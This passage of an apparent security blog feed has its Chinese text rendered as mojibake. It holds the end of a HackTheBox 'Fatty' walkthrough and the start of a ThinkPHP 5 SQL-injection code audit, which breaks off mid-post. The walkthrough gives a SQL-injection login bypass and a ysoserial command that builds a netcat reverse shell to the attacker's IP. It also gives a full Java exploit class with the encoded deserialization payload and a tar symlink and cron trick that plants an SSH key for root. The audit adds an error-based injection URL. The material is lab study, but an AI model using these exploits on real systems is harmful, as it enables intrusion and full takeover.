¹æ®æŸ¥è¯¢ç»“æœè¿”å›æ•°æ®æ¥å®ä¾‹åŒ–Userç±»è¿›è€Œåˆ¤æ–­roleæ˜¯å¦ä¸ºadminçš„ã€‚æˆ‘ä»¬åªéœ€è¦</p><pre><code class="java">User user=new User(&quot; abc&#39; UNION SELECT 1,&#39;byc_404&#39;,&#39;a@b.com&#39;,&#39;byc_404&#39;,&#39;admin&quot;,&quot;byc_404&quot;,false);</code></pre><p>é¦–å…ˆä¿è¯Userç±»hashå€¼ä¸ºfalseã€‚è¿™æ ·passwordä¸ä¼šè¿›è¡Œsha256èµ‹å€¼ã€‚ç„¶åç”±äºabcç”¨æˆ·ä¸å­˜åœ¨ã€‚æˆ‘ä»¬unionæŸ¥è¯¢è¿”å›çš„å€¼å³</p><pre><code class="sql">1,&#39;byc_404&#39;,&#39;a@b.com&#39;,&#39;byc_404&#39;,&#39;admin&#39;</code></pre><p>ç”¨æˆ·roleå·²ç»è¢«è®¾ä¸ºadminäº†.<br>æ­¤æ—¶passwordä¸passwordç›¸åŒã€‚æ ¡éªŒé€šè¿‡</p><p>æˆ‘ä»¬æ›´æ”¹ä¸‹expä¸­userå®ä¾‹åŒ–çš„æ–¹æ³•ã€‚å¹¶ä¸”å°è¯•è°ƒç”¨adminæƒé™çš„ipconfig<br><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/8.PNG" class="lazyload" data-srcset="8.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æˆåŠŸæ‰§è¡Œã€‚æ­¤å¤„è¿˜å¯ä»¥ä»ipconfigä¸­172.28çœ‹å‡ºæ¥javaè¿è¡Œçš„é¶æœºä¼¼ä¹æ˜¯dockerã€‚</p><p>ç°åœ¨æˆ‘ä»¬å°±å¯ä»¥å°è¯•changePWè¿›è¡Œååºåˆ—åŒ–äº†ã€‚ä¸è¿‡åŒæ ·ç”±äºåŸå§‹changePWæ–¹æ³•åªä¼ é€’ä¸€ä¸ªåŒå‚æ•°Userå¯¹è±¡ã€‚é‚£ä¹ˆæˆ‘ä»¬è¿˜å¾—é‡å†™changePWæ–¹æ³•ã€‚</p><pre><code class="java">public String changePW(String payload) throws MessageParseException, MessageBuildException, IOException {    this.action=new ActionMessage(this.sessionID,&quot;changePW&quot;);    this.action.addArgument(payload);    this.sendAndRecv();    return this.response.getContentAsString();}</code></pre><p>æ›´æ”¹Invokeræºç å,ç„¶åå°±æ˜¯æŒ‰ç…§ä¸Šé¢çš„æµç¨‹é‡æ–°build jaråŒ…äº†ã€‚</p><p>é‡æ–°å¯¼å…¥åä½¿ç”¨ysoserialç”Ÿæˆpayload</p><pre><code class="bash">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 &#39;nc 10.10.14.25 9001 -e /bin/sh&#39; |base64 -w 0</code></pre><p>(dockeré¶æœºæ²¡æœ‰bashâ€¦alpineé¶æœºé€šç—…ã€‚æ‰€å¹¸æœ‰è€ç‰ˆæœ¬nc)</p><p>æœ€ç»ˆçš„exp</p><pre><code class="java">import htb.fatty.client.connection.Connection;import htb.fatty.client.methods.Invoker;import htb.fatty.shared.message.MessageBuildException;import htb.fatty.shared.message.MessageParseException;import htb.fatty.shared.resources.User;import java.io.IOException;public class exploit {    public static void main(String[] args) throws  IOException{        Connection conn = null;        try {            conn = Connection.getConnection();        }catch(Exception e){            System.out.println(&quot;[-] connection failed: &quot;+ e.getMessage());            System.exit(1);        }        System.out.println(&quot;[+] Successfully connected&quot;);        User user=new User(&quot; abc&#39; UNION SELECT 1,&#39;byc_404&#39;,&#39;a@b.com&#39;,&#39;byc_404&#39;,&#39;admin&quot;,&quot;byc_404&quot;,false);        if(conn.login(user)){            System.out.println(&quot;[+] Successfully logged in&quot;);        }else{            System.out.println(&quot;[-] Login failed&quot;);        }        String rolename=conn.getRoleName();        user.setRoleByName(rolename);        System.out.println(&quot;[+] rolename is: &quot;+rolename);        Invoker invoker =new Invoker(conn,user);        String response=&quot;&quot;;        String payload=&quot;rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAA3NyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAUXQAJnlzb3NlcmlhbC5wYXlsb2Fkcy5Db21tb25zQ29sbGVjdGlvbnM1dAAYQ29tbW9uc0NvbGxlY3Rpb25zNS5qYXZhdAAJZ2V0T2JqZWN0c3EAfgALAAAAM3EAfgANcQB+AA5xAH4AD3NxAH4ACwAAACJ0ABl5c29zZXJpYWwuR2VuZXJhdGVQYXlsb2FkdAAUR2VuZXJhdGVQYXlsb2FkLmphdmF0AARtYWluc3IAJmphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVMaXN0/A8lMbXsjhACAAFMAARsaXN0cQB+AAd4cgAsamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUNvbGxlY3Rpb24ZQgCAy173HgIAAUwAAWN0ABZMamF2YS91dGlsL0NvbGxlY3Rpb247eHBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhxAH4AGnhzcgA0b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmtleXZhbHVlLlRpZWRNYXBFbnRyeYqt0ps5wR/bAgACTAADa2V5cQB+AAFMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAF4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWVxAH4ABVsAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AMgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ADJzcQB+ACt1cQB+AC8AAAACcHVxAH4ALwAAAAB0AAZpbnZva2V1cQB+ADIAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAvc3EAfgArdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQAHm5jIDEwLjEwLjE0LjI1IDkwMDEgLWUgL2Jpbi9zaHQABGV4ZWN1cQB+ADIAAAABcQB+ADdzcQB+ACdzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeHg=&quot;;        try {            response=invoker.changePW(payload);        } catch (MessageParseException e) {            e.printStackTrace();        } catch (MessageBuildException e) {            e.printStackTrace();        } catch (IOException e) {            e.printStackTrace();        }        System.out.println(&quot;Server response:\n&quot;+ response);    }}</code></pre><p>æ¥åˆ°å›æ˜¾åä½¿ç”¨<code>ash -i 2&gt;&amp;1</code>å‡çº§tty.(æ²¡æœ‰python,socatã€‚ä½†æ˜¯å¯ä»¥ç”¨ash)<br><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/9.PNG" class="lazyload" data-srcset="9.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>user qtc done.</p><p>å°ç»“ä¸‹,è¿™ä¸ªéƒ¨åˆ†çœŸå¿ƒå›°éš¾ã€‚å‡å¦‚æˆ‘æ²¡æœ‰çœ‹wpçš„è¯ä¼°è®¡æ—©å°±åœ¨ä¸­é—´æŸä¸ªç¯èŠ‚æ”¾å¼ƒäº†ã€‚ä½†æ˜¯æ•´ä½“æµç¨‹ä¸‹æ¥å…³äºjavaçš„ä¸€äº›æ“ä½œè®©æˆ‘å—ç›ŠåŒªæµ…ã€‚å°¤å…¶æ˜¯jaråŒ…çš„éƒ¨åˆ†ã€‚å½“ç„¶æˆ‘ä¹Ÿå¸Œæœ›èƒ½æ‰¾åˆ°é‡å†™jaråŒ…ä»£ç çš„æœ€ä½³æ–¹æ¡ˆã€‚</p><h2 id="privesc-to-root"><a href="#privesc-to-root" class="headerlink" title="privesc to root"></a>privesc to root</h2><p>æ¥ä¸‹æ¥çš„éƒ¨åˆ†å°±æ¯”è¾ƒç®€å•äº†ã€‚åˆšåˆšæˆ‘ä»¬åœ¨start.shä¸­çœ‹åˆ°æ‰§è¡Œçš„å‘½ä»¤é™¤äº†jarä»¥å¤–è¿˜æœ‰cronçš„å®šæ—¶ä»»åŠ¡ã€‚æŸ¥çœ‹ä¸‹æ–‡ä»¶å‘ç°å­˜åœ¨/etc/crontabs.backã€‚å…¶ä¸­å­˜åœ¨å¤‡ä»½çš„cronjobæ–‡ä»¶</p><pre><code class="bash">0 * * * * /bin/tar -cf /opt/fatty/tar/logs.tar /opt/fatty/logs/ </code></pre><p>å®ƒåœ¨å®šæ—¶åœ°å°†<code>/opt/fatty/logs/</code> ä¸‹çš„å†…å®¹æ‰“åŒ…åˆ°<code>/opt/fatty/tar/logs.tar</code><br>æ—¢ç„¶å¦‚æ­¤æˆ‘ä»¬çœ‹çœ‹é¶æœºåˆ°åº•å¯¹taræ–‡ä»¶åšäº†ä»€ä¹ˆ</p><p><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/10.PNG" class="lazyload" data-srcset="10.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å¯ä»¥çœ‹åˆ°ã€‚fattyæœ¬æœºåœ¨æ¯éš”ä¸€åˆ†é’Ÿä½¿ç”¨scpåŒæ­¥æ–‡ä»¶ã€‚é‚£ä¹ˆå‡å¦‚å®ƒæ˜¯rootç”¨æˆ·åœ¨æœ¬æœºè°ƒç”¨scpå¹¶ä¸”æ‰§è¡Œè§£åŒ…æ“ä½œã€‚æˆ‘ä»¬å°±æœ‰åŠæ³•è¿›è¡Œææƒ</p><pre><code class="bash">ln -sf /root/.ssh/authorized_keys out/logs.tartar -cf logs.tar -C out/ logs.tar tar -tvf logs.tar</code></pre><p>é¦–å…ˆæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæŒ‡å‘rootå…¬é’¥çš„è½¯é“¾æ¥ã€‚å¹¶ä¸”æ‰“åŒ…å®ƒè‡ªå·±ã€‚<br><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/11.PNG" class="lazyload" data-srcset="11.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>å¯çœ‹åˆ°æ­¤æ—¶logs.taré‡Œçš„å†…å®¹æ˜¯ä¸€ä¸ªæŒ‡å‘root sshå…¬é’¥çš„è½¯é“¾æ¥ã€‚å‡å¦‚æˆ‘ä»¬è§£å‹å®ƒçš„è¯,å°†å¾—åˆ°å®ƒæœ¬èº«ã€‚<br>æ¥ä¸‹æ¥æˆ‘ä»¬æŠŠå®ƒç§»åŠ¨åˆ°<code>/opt/fatty/tar/logs.tar</code>.é‚£ä¹ˆæ­¤æ—¶å®šæ—¶ä»»åŠ¡æŒ‡æ‰§è¡Œçš„è¯,å°†æŠŠå®ƒè½¬ç§»åˆ°æœ¬æœºã€‚å¹¶ä¸”è§£åŒ…ï¼Œä»è€Œå¾—åˆ°ä¸€ä¸ªlogs.taræ–‡ä»¶,å¹¶ä¸”å®ƒæ˜¯ä¸€ä¸ªæŒ‡å‘å…¬é’¥çš„è½¯é“¾æ¥ã€‚</p><p>æ¥ä¸‹æ¥ã€‚å‡å¦‚æˆ‘ä»¬æŠŠdockerä¸Šçš„logs.taræ¢æˆä¸€ä¸ªåŒ…å«æˆ‘ä»¬sshå…¬é’¥çš„æ–‡ä»¶ã€‚é‚£ä¹ˆå½“cronjobå†æ¬¡æ‰§è¡Œæ—¶,scpä¼šæŠŠæ–°çš„logs.tar è¦†ç›–æ—§çš„ã€‚è€Œæ—§çš„logs.taræ˜¯ä¸€ä¸ªæŒ‡å‘sshå…¬é’¥çš„è½¯é“¾æ¥</p><p>è¿™æ ·çš„è¯æ€è·¯å°±éå¸¸æ¸…æ¥šäº†ã€‚åœ¨ä¸Šé¢æ‰§è¡Œå®Œlogs.taråæ‰§è¡Œä»¥ä¸‹å‘½ä»¤</p><pre><code>cp logs.tar /opt/fatty/tar/logs.tar sleep 60echo -n &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCaTnVHUaEL07CrQQoNh1zhTfnl5m6OGd4HPwmutz2ZkEf5fWSXrtMyrlxvNP5mtinS8vlRgEtF4KAsXkFceq4Ga/ahgcYTdcKNFJQiBDz3cC1gu4az4mfdSYGIYav0UAiUel5lWN8SJ8FLUEd1hK85dIMOFLZoKNCO1gm1zOMQFB6A+WVUbchPhLm718YMkAawCHXzxhBEwJuQ1Il7wGWyZaPzuCTR+Dgci4xZDVr7459hfQJpGz7ZmTb9msnlk3Vnd156WnbR95qMkHPlaA0DMKPvs/GjBf2dCREGdfZloTDo6yf/b3Ev9d4n4EiF53nc38jlxLARckbAZwA15DwS15WbOS31ZV/ZOi3YtKSkmA7nMRYoE0QZ5uhRMZySB1FfxtHOkZV+EnXD4WPeZwG23sIpQ3AYjlbuOiybnrK5iuKcf8uclLsvf7ToahPDhZSot2bH8gnS20mcC/sb+uLrkdI85Qn8oCe7OoLeF/QxESa/lIMalSvml6dSvR8ORNk= root@byc404&#39; &gt; /opt/fatty/tar/logs.tar </code></pre><p><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/12.PNG" class="lazyload" data-srcset="12.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>rooted.</p><h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>  fatty ä½œä¸ºinsaneéš¾åº¦çš„é¶æœºç¡®å®â€å®è‡³åå½’â€ã€‚javaç›¸å…³çš„çŸ¥è¯†ææ€•èƒ½åœ¨ä¸€å¼€å§‹å°±åŠé€€å¾ˆå¤šäººäº†ã€‚ä¸è¿‡å¹¸å¥½è‡ªå·±ä¹‹å‰å­¦ä¹ äº†java webçš„ä¸€äº›åŸºç¡€çŸ¥è¯†,åœ¨è¿™é‡Œçš„å®é™…åœºæ™¯æ‰èƒ½å‘æŒ¥ä½œç”¨ã€‚ä¸€æ¬¡æ¸—é€èƒ½å­¦åˆ°å¾ˆå¤šçŸ¥è¯†ï¼Œç¡®å®å€¼å¾—ç‚¹èµã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> hackthebox </tag>
            
            <tag> pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Thinkphp-vuln</title>
      <link href="2020/08/05/Thinkphp-vuln/"/>
      <url>2020/08/05/Thinkphp-vuln/</url>
      
        <content type="html"><![CDATA[<p>  è¿™æ®µæ—¶é—´å› ä¸ºä¸€äº›åŸå› è€æ˜¯æœ‰ç‚¹è‡ªæˆ‘çº ç»“,å¾ˆå¤§ç¨‹åº¦ä¸Šæ˜¯å› ä¸ºå¯¹æ‰€è®¡åˆ’å­¦ä¹ çš„å†…å®¹æ— æ³•å®šå¤ºçš„åŸå› ã€‚ä¸Šå‘¨å› ä¸ºhwæ‰€ä»¥é”™è¿‡äº†wmctf,èµ›åå»çœ‹é¢˜å‘ç°åŸºæœ¬éƒ½æ˜¯phpä¹‹ç±»çš„,éƒ½ä¸æ˜¯å¾ˆæƒ³çœ‹ã€‚ç›¸å¯¹æ„Ÿå…´è¶£çš„æ¡†æ¶çš„é“¾å­è‡ªå·±ä¹Ÿæ²¡æ‰¾å…¨ã€‚æ„Ÿè§‰èœçš„ä¸è¡Œ,ç›¸æ¯”å‡ ä¸ªæœˆå‰å®¡ä¸€äº›æ¯”èµ›ä¸­çš„æ¡†æ¶æ‰‹ç”Ÿäº†å¾ˆå¤šã€‚</p><a id="more"></a><p>  æœ€è¿‘å› ä¸ºä¸€ç›´åœ¨çœ‹Node.jsç›¸å…³çš„æ¼æ´è·Ÿå¼€å‘å»äº†,åŠ ä¸Šè‡ªå·±ä¸€ç›´å¯¹phpå¿ƒé‡Œæœ‰ç§åŒæ¶æ„Ÿ,å¯¼è‡´æ²¡æœ‰åŠ²å¤´å»æ·±å…¥å­¦ä¹ ã€‚è€Œä¸Šå‘¨hwçš„ç»å†è®©æˆ‘æ„è¯†åˆ°phpä»æ—§æ˜¯å›½å†…å„ç§ç½‘ç«™çš„å¤§å¤´ã€‚æ‰€ä»¥ç—›ä¸‹å†³å¿ƒ,å¼€å§‹æŠŠphpè·Ÿjavaçš„çŸ¥è¯†åŒæ­¥å­¦ä¹ ã€‚è¿™é‡Œå°±ç”¨çº¢æ—¥ä¸ƒæœˆç«å¸ˆå‚…ä»–ä»¬çš„<a href="https://github.com/Mochazz/ThinkPHP-Vuln" target="_blank" rel="noopener">thinkphpvuln</a>é¡¹ç›®å§ã€‚å¸Œæœ›èƒ½å¤Ÿå¯¹ä»£å®¡çš„åŠŸåŠ›æœ‰æ‰€æå‡ã€‚</p><h2 id="tp5-sqli-insert"><a href="#tp5-sqli-insert" class="headerlink" title="tp5-sqli-insert"></a>tp5-sqli-insert</h2><p>å®‰è£…çš„è¯composer ä¸€æŠŠæ¢­ã€‚å…·ä½“å‚è§Thinkphp-vulné¡¹ç›®ã€‚å®‰è£…tpdemo<br>5.0.13&lt;=ThinkPHP&lt;=5.0.15 ã€ 5.1.0&lt;=ThinkPHP&lt;=5.1.5 ç‰ˆæœ¬é—´çš„sqlæ³¨å…¥æ¼æ´ã€‚åˆ©ç”¨çš„è¯éœ€è¦æ›´æ”¹Index.php</p><pre><code class="php">&lt;?phpnamespace app\index\controller;class Index{    public function index()    {        $username = request()-&gt;get(&#39;username/a&#39;);        db(&#39;users&#39;)-&gt;insert([&#39;username&#39; =&gt; $username]);        return &#39;Update success&#39;;    }}</code></pre><p>åˆ©ç”¨payload</p><pre><code>http://localhost/tpdemo/public/?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7e,user(),0x7e),1)&amp;username[2]=1</code></pre><p><img src="/2020/08/05/Thinkphp-vuln/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ³¨æ„è¿™æ˜¯åœ¨å¼€å¯äº†tpçš„app_debugæƒ…å†µä¸‹çš„ã€‚å¦åˆ™æˆ‘ä»¬çš„æŠ¥é”™æ³¨å…¥åº”è¯¥æ˜¯çœ‹ä¸åˆ°å›æ˜¾ã€‚</p><p>é¦–å…ˆæˆ‘ä»¬è·Ÿç€Index.phpä¸­dbè¿™è¡Œè¯­å¥,è·Ÿè¿›think/db/Query.phpçš„insertå‡½æ•°ã€‚<br><img src="/2020/08/05/Thinkphp-vuln/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>æ‰§è¡Œçš„sqlè¯­å¥å¦‚ä¸‹ã€‚æˆ‘ä»¬å¿…ç„¶è¦è·Ÿè¿›è¿™ä¸ªsqlè¯­å¥ç ”ç©¶æ³¨å…¥çš„å¯èƒ½ã€‚</p><pre><code class="php">$sql = $this-&gt;builder-&gt;insert($data, $options, $replace);</code></pre><p>é¦–å…ˆ <code>$this-&gt;builder</code> ä¸º\think\db\builder\Mysql ç±»(è¿™ä¸ªå…¶å®å°±å–å†³äºä½ è¿æ¥çš„æ•°æ®åº“ç±»å‹ã€‚ç¨å¾®å¾€å‰è·Ÿä¸‹å¯ä»¥çœ‹åˆ°) Mysqlç±»ç»§æ‰¿äºBuilderç±»ã€‚æ‰€ä»¥<br>çœ‹å‘Builderçš„insertå‡½æ•°ã€‚</p><p><img src="/2020/08/05/Thinkphp-vuln/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è¿™é‡Œå…ˆè·Ÿè¿›ä¸‹parseData</p><pre><code class="php">protected function parseData($data, $options){    if (empty($data)) {        return [];    }    // è·å–ç»‘å®šä¿¡æ¯    $bind = $this-&gt;query-&gt;getFieldsBind($options[&#39;table&#39;]);    if (&#39;*&#39; == $options[&#39;field&#39;]) {        $fields = array_keys($bind);    } else {        $fields = $options[&#39;field&#39;];    }    $result = [];    foreach ($data as $key =&gt; $val) {        $item = $this-&gt;parseKey($key, $options);        if (is_object($val) &amp;&amp; method_exists($val, &#39;__toString&#39;)) {            // å¯¹è±¡æ•°æ®å†™å…¥            $val = $val-&gt;__toString();        }        if (false === strpos($key, &#39;.&#39;) &amp;&amp; !in_array($key, $fields, true)) {            if ($options[&#39;strict&#39;]) {                throw new Exception(&#39;fields not exists:[&#39; . $key . &#39;]&#39;);            }        } elseif (is_null($val)) {            $result[$item] = &#39;NULL&#39;;        } elseif (is_array($val) &amp;&amp; !empty($val)) {            switch ($val[0]) {                case &#39;exp&#39;:                    $result[$item] = $val[1];                    break;                case &#39;inc&#39;:                    $result[$item] = $this-&gt;parseKey($val[1]) . &#39;+&#39; . floatval($val[2]);                    break;                case &#39;dec&#39;:                    $result[$item] = $this-&gt;parseKey($val[1]) . &#39;-&#39; . floatval($val[2]);                    break;            }        } elseif (is_scalar($val)) {            // è¿‡æ»¤éæ ‡é‡æ•°æ®            if (0 === strpos($val, &#39;:&#39;) &amp;&amp; $this-&gt;query-&gt;isBind(substr($val, 1))) {                $result[$item] = $val;            } else {                $key = str_replace(&#39;.&#39;, &#39;_&#39;, $key);                $this-&gt;query-&gt;bind(&#39;data__&#39; . $key, $val, isset($bind[$key]) ? $bind[$key] : PDO::PARAM_STR);                $result[$item] = &#39;:data__&#39; . $key;            }        }    }    return $result;}</code></pre><p>parsedataæ¥å—çš„å‚æ•°æ˜¯æˆ‘ä»¬ä¼ è¿›çš„å‚æ•°useranmeæ•°æ®ã€‚ç®€å•çœ‹ä¸‹ä¼šå‘ç°ä¸­é—´çš„ä¸€ä¸ªforå¾ªç¯æ˜¯åœ¨éå†æˆ‘ä»¬ä¼ è¿›çš„æ•°ç»„å¹¶ä¸”åªæ˜¯è¿›è¡Œä¸€ä¸ªæ‹¼æ¥çš„æ“ä½œã€‚æœ€åè¿”å›æ•°æ®ã€‚æ¯”å¦‚æˆ‘ä»¬çš„payloadå¯¹åº”å¦‚ä¸‹ã€‚<code>$val[0]=inc</code>,ä¹‹åè¿”å›çš„<code>$result</code>åªæ˜¯<code>$val[1],$val[2]</code>çš„æ‹¼æ¥ã€‚parseKey æ–¹æ³•å¹¶æ²¡æœ‰åœ¨å¤„ç†æˆ‘ä»¬çš„è¾“å…¥æ•°æ®åå½±å“ä»€ä¹ˆã€‚</p><pre><code class="php">case &#39;inc&#39;:    $result[$item] = $this-&gt;parseKey($val[1]) . &#39;+&#39; . floatval($val[2]);    break;</code></pre><p>æ‰€ä»¥è¿™é‡Œå¤„ç†å®Œåå›åˆ°insertå‡½æ•°ã€‚æˆ‘ä»¬çš„è¾“å…¥ç›´æ¥é€åˆ°è¿”å›æ‹¼æ¥çš„sqlè¯­å¥ã€‚é€ æˆsqlæ³¨å…¥<br>å®Œæ•´è¯­å¥ä¸å¦¨ç›´æ¥åœ¨debugæŠ¥é”™çš„åœ°æ–¹çœ‹ã€‚ä¼šå‘ç°å›æ˜¾äº†sqlè¯­å¥</p><pre><code class="sql">INSERT INTO `users` (`username`) VALUES (updatexml(1,concat(0x7e,version(),0x7e),1)+1)</code></pre><p>æ˜¾ç„¶ä¸Šé¢caseè¯­å¥é‚£é‡Œç†è®ºä¸Š<code>exp,inc,dec</code>éƒ½å¯ä»¥é€ æˆsqlæ³¨å…¥ã€‚ä½†å®é™…æµ‹è¯•ä¼šå‘ç°åªæœ‰<code>username[0]</code>ä¸º<code>exp</code>æ— æ³•æ³¨å…¥ã€‚è¿™æ˜¯å› ä¸ºthinkphpå†…ç½®è¿‡æ»¤ä¼šå°†expå¤„ç†å˜ä¸º<code>exp{ç©ºæ ¼}</code>ã€‚å¯¼è‡´æ— æ³•æ³¨å…¥ã€‚</p><h2 id="tp5-sqli-update"><a href="#tp5-sqli-update" class="headerlink" title="tp5-sqli-update"></a>tp5-sqli-update</h2><p>é…ç½®Index.php</p><pre><code class="php">&lt;?phpnamespace app\index\controller;class Index{    public function index()    {        $username = request()-&gt;get(&#39;username/a&#39;);        db(&#39;users&#39;)-&gt;where([&#39;id&#39; =&gt; 1])-&gt;update([&#39;username&#39; =&gt; $username]);        return &#39;Update 